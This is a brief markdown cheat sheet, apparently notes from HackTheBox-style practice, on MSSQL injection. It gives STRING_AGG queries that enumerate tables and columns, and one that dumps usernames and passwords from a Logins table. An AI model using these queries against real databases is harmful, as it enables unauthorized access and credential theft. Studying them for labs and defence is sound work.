# MSSQL Injection

some hit for mssql injection

`LIMIT` function need to know the columns name.

## Like mysql function name 

`GROUP_CONCAT` --> `STRING_AGG`

## List Tables

```mssql
# NO WORK
SELECT STRING_AGG(name,",") FROM master..sysobjects WHERE xtype = 'U'

# WORK
SELECT STRING_AGG(name,',') FROM master..sysobjects WHERE xtype = 'U'
```

## List Columns

Reference: https://www.mytecbits.com/microsoft/sql-server/list-of-column-names

```mssql
SELECT STRING_AGG(NAME,',') FROM SYS.COLUMNS WHERE object_id = OBJECT_ID('Hub_DB..Logins')

```
## Example

```mssql
# Dump id,username,password from HTB_DB..Logins
SELECT STRING_AGG(concat(id,',',username,',',password),'|') FROM Hub_DB..Logins
```
